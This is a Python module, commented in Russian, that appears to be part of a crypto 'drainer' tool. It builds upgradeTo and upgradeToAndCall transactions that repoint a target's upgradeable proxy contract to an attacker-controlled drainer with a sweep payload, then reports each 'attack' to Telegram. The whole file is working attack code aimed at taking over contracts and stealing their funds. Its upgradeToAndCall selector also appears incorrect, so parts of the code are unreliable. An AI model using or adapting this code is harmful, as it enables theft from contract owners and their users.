from utils.logger import log_info, send_telegram_message
from config.settings import DRAINER_ADDRESSES, EXPLORERS, USE_UPGRADE_AND_CALL
from utils.tx_utils import build_and_send_tx
from core.drain_payloads import build_sweep_payload

# Сигнатуры
UPGRADE_SIG = "0x3659cfe6"
UPGRADE_AND_CALL_SIG = "0xf851a440"

def build_upgrade_payload(drainer_address: str) -> str:
    """
    Формирует calldata для функции upgradeTo(address).
    """
    return UPGRADE_SIG + drainer_address[2:].rjust(64, "0")

def build_upgrade_and_call_payload(drainer_address: str) -> str:
    """
    Формирует calldata для функции upgradeToAndCall(address,bytes).
    """
    sweep_data = build_sweep_payload()[2:]  # удаляем "0x"
    data = (
        UPGRADE_AND_CALL_SIG +
        drainer_address[2:].rjust(64, "0") +
        hex(64)[2:].rjust(64, "0") +
        hex(len(sweep_data) // 2)[2:].rjust(64, "0") +
        sweep_data.ljust(64, "0")
    )
    return "0x" + data

async def execute_attack(network: str, contract_address: str, tx_hash: str, use_upgrade_and_call: bool = USE_UPGRADE_AND_CALL):
    log_info(f"[{network}] 🚀 Атака на {contract_address} | TX: {tx_hash[:10]}...")

    try:
        drainer_address = DRAINER_ADDRESSES[network]

        if use_upgrade_and_call:
            payload = build_upgrade_and_call_payload(drainer_address)
            log_info(f"[{network}] ⚡ Используем upgradeToAndCall")
        else:
            payload = build_upgrade_payload(drainer_address)
            log_info(f"[{network}] 🪛 Используем upgradeTo")

        sent_tx = await build_and_send_tx(
            network=network,
            to_address=contract_address,
            data=payload,
            value=0
        )

        log_info(f"[{network}] 🎯 Атака отправлена: {sent_tx}")

        # Telegram уведомление
        explorer_prefix = EXPLORERS.get(network, f"https://explorer.{network}.org/tx/")
        tx_link = f"{explorer_prefix}{sent_tx}"

        msg = (
            f"🚨 <b>Атака выполнена</b>\n"
            f"🌐 Сеть: <b>{network.upper()}</b>\n"
            f"📦 Контракт: <code>{contract_address}</code>\n"
            f"🧰 Метод: {'upgradeToAndCall' if use_upgrade_and_call else 'upgradeTo'}\n"
            f"📤 TX: <a href='{tx_link}'>{sent_tx[:12]}...</a>"
        )
        await send_telegram_message(msg)

    except Exception as e:
        log_info(f"[{network}] ❌ Ошибка атаки: {e}")

